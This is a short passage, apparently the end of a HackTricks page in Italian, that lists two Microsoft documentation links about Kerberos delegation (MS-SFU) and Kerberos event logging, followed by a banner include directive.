- [21] [Microsoft MS-SFU - Uso di ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Abilitare la registrazione degli eventi Kerberos](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
